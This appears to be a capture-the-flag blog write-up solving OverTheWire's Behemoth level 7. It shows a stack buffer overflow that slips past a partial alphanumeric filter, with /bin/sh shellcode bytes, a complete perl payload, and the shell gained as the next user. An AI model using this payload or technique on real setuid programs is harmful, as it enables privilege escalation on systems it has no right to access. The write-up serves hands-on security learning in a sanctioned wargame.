---
layout: post
title: OverTheWire - Behemoth 7
---

Site: http://overthewire.org/wargames/behemoth/ <br>
Level: 7<br>
Situation: Stackoverflow limited space<br><br>

This one had me stuck until I stepped back and tried a simpler shell code specifically "exit". Supplied me with what I needed to figure it out.

There are multiple solutions to this problem. The one i chose involved utilizing the buffer size i had available to me rather than loading the shell code from a different area.

We start as usual create our temp directory, upload our invoker.sh script and shellcalc. The find the arch type of the file and get the output.

{% highlight bash %}
behemoth7@melinda:~$ mkdir /tmp/bh7
behemoth7@melinda:~$ cd /tmp/bh7
behemoth7@melinda:/tmp/bh7 
{% endhighlight %}

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ file /behemoth/behemoth7
/behemoth/behemoth7: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=d826bb4499d044b507b5c3c0653c0353f9646b70, not stripped
{% endhighlight %}

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ /behemoth/behemoth7
behemoth7@melinda:/tmp/bh7$
{% endhighlight %}

Nothing useful lets go ahead and run an objdump and strings to get some more info.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ objdump -R /behemoth/behemoth7

/behemoth/behemoth7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804993c R_386_GLOB_DAT    __gmon_start__
08049974 R_386_COPY        stderr
0804994c R_386_JUMP_SLOT   strcpy
08049950 R_386_JUMP_SLOT   __gmon_start__
08049954 R_386_JUMP_SLOT   exit
08049958 R_386_JUMP_SLOT   strlen
0804995c R_386_JUMP_SLOT   __libc_start_main
08049960 R_386_JUMP_SLOT   fprintf
08049964 R_386_JUMP_SLOT   memset
08049968 R_386_JUMP_SLOT   __ctype_b_loc
{% endhighlight %}

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ strings /behemoth/behemoth7
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
strcpy
exit
strlen
memset
__ctype_b_loc
stderr
fprintf
__libc_start_main
__gmon_start__
GLIBC_2.3
GLIBC_2.0
PTRh
QVh-
[^_]
alpha
Non-%s chars found in string, possible shellcode!
;*2$"
{% endhighlight %}

Seems as if memset is being called, also a very interesting string "alpha
Non-%s chars found in string, possible shellcode!". We can assume when combined it looks like printf("Non-%s chars found in string, possible shellcode!", "alpha").

The string seems to tell us that alphanumeric is our only option we can test this by trying the following.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ /behemoth/behemoth7 `perl -e 'print "\x90"'`
Non-alpha chars found in string, possible shellcode!

{% endhighlight %}

We know that it is confirmed we will need to use non-alpha characters or at least that’s how it seems so far. Before we continue down that route we will complete our info gathering by running an ltrace with and without data input.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ ltrace /behemoth/behemoth7
__libc_start_main(0x804852d, 1, 0xffffd784, 0x80486a0 <unfinished ...>

-- SNIP --
strlen("PWD=/tmp/bh7")                             = 12
memset(0xffffded6, '\0', 12)                       = 0xffffded6
strlen("LANG=en_US.UTF-8")                         = 16
memset(0xffffdee3, '\0', 16)                       = 0xffffdee3
strlen("SHLVL=1")                                  = 7
memset(0xffffdef4, '\0', 7)                        = 0xffffdef4
strlen("HOME=/home/behemoth7")                     = 20
memset(0xffffdefc, '\0', 20)                       = 0xffffdefc
strlen("LOGNAME=behemoth7")                        = 17
memset(0xffffdf11, '\0', 17)                       = 0xffffdf11
strlen("SSH_CONNECTION=75.172.131.100 40"...)      = 53
memset(0xffffdf23, '\0', 53)                       = 0xffffdf23
strlen("LESSOPEN=| /usr/bin/lesspipe %s")          = 31
memset(0xffffdf59, '\0', 31)
+++ exited (status 0) +++

-- SNIP --
{% endhighlight %}

This first run shows that all our environment variables are being zeroed out. So we know we will not be using an environment egg.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ ltrace /behemoth/behemoth7 testinput
__libc_start_main(0x804852d, 2, 0xffffd764, 0x80486a0 <unfinished ...>
-- SNIP --
memset(0xffffded6, '\0', 12)                       = 0xffffded6
strlen("LANG=en_US.UTF-8")                         = 16
memset(0xffffdee3, '\0', 16)                       = 0xffffdee3
strlen("SHLVL=1")                                  = 7
memset(0xffffdef4, '\0', 7)                        = 0xffffdef4
strlen("HOME=/home/behemoth7")                     = 20
memset(0xffffdefc, '\0', 20)                       = 0xffffdefc
memset(0xffffdfcd, '\0', 22)                       = 0xffffdfcd
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
__ctype_b_loc()                                    = 0xf7e216c8
strcpy(0xffffd4b4, "testinput")                    = 0xffffd4b4
+++ exited (status 0) +++
-- SNIP --
{% endhighlight %}

Looks like our information is being passed to __ctype_b_loc creating a pointer into an array of characters. For ctype functions. 

Now we will be using GDB to disassemble the application and see what is going on and if it is helpful.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ ./invoker.sh -d /behemoth/behemoth7
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
-- SNIP --
   0x08048551 <+36>:	jmp    0x80485a1 <main+116>
   0x08048553 <+38>:	mov    eax,DWORD PTR [esp+0x218]
   0x0804855a <+45>:	lea    edx,[eax*4+0x0]
   0x08048561 <+52>:	mov    eax,DWORD PTR [ebp+0x10]
   0x08048564 <+55>:	add    eax,edx
   0x08048566 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048568 <+59>:	mov    DWORD PTR [esp],eax
   0x0804856b <+62>:	call   0x80483e0 <strlen@plt>

End of assembler dump.
-- SNIP --
{% endhighlight %} 

Nothing immediately useful. Let’s go ahead and do a test for some common vulnerabilities. Let’s go ahead and throw a large string to see if we can cause a crash.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ /behemoth/behemoth7 `perl -e 'print "A"x600'`
Segmentation fault
{% endhighlight %}

Looks like we might be on to something. Let’s go ahead and use metasploit to figure out the exact length required to crash the application.

We end up finding out that the size is 536.

{% highlight bash %}
(gdb) run $(perl -e 'print "A"x536 . "AAAA"')
Starting program: /games/behemoth/behemoth7 $(perl -e 'print "A"x536 . "AAAA"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
{% endhighlight %}

Now we know that it is requiring alpha numeric characters. However we can test to see if there is a limit on how much of the buffer is checked. We will try 256 and 512. Some standard buffer sizes.

{% highlight bash %}

(gdb) run $(perl -e 'print "A"x256 . "\x90" . "A"x279 . "AAAA"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /games/behemoth/behemoth7 $(perl -e 'print "A"x256 . "\x90" . "A"x279 . "AAAA"')
Non-alpha chars found in string, possible shellcode!
[Inferior 1 (process 12234) exited with code 01]
{% endhighlight %}

{% highlight bash %}
(gdb) run $(perl -e 'print "A"x512 . "\x90" . "A"x23 . "AAAA"')
Starting program: /games/behemoth/behemoth7 $(perl -e 'print "A"x512 . "\x90" . "A"x23 . "AAAA"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

{% endhighlight %}

Looks like there is a limit on the size. Now 512 of our total buffer size is dedicated to filling the check buffer meaning we have 24 bytes left to store our shell code and put an indicator to help us find the address. So the format for our payload is going to be.

DATA <> NOP <> SHELLCODE <> ADDRESS

Our shell code to spawn a shell is 21 bytes long leaving us 3 bytes for an identifier.

{% highlight bash %}
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
{% endhighlight %}

The complete payload now looks like this.

{% highlight perl %}
perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "AAAA"'
{% endhighlight %}

All we need to do now is locate our small nopsled. We know that the address is going to be 0x90909041. So we can search for this pattern.

{% highlight bash %}
(gdb) run $(perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "AAAA"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/behemoth/behemoth7 $(perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "AAAA"')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) find $esp,$esp+1000,0x90909041
0xffffdfa7
1 pattern found.
{% endhighlight %}

Now we can't use that address directly due to the 41 that exist. So we simply increment the address by one which will give us the beginning of the nopsled. Making our new address 0xffffdfa8.

Our payload is now.

{% highlight bash %}
perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\xa8\xdf\xff\xff"'
{% endhighlight %}

Now if everything goes as planned we should get a shell or at least /bin/sh being called.

{% highlight bash %}
(gdb) run $(perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\xa8\xdf\xff\xff"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/behemoth/behemoth7 $(perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\xa8\xdf\xff\xff"')
process 9559 is executing new program: /bin/dash
$ 
{% endhighlight %}

Now we just run it in userspace.

{% highlight bash %}
behemoth7@melinda:/tmp/bh7$ ./invoker.sh /behemoth/behemoth7 `perl -e 'print "A"x512 . "\x90"x3 .  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\xa8\xdf\xff\xff"'`
$ whoami
behemoth8
$ cat /etc/behemoth_pass/behemoth8
[OMITTED]

{% endhighlight %}

There is our password.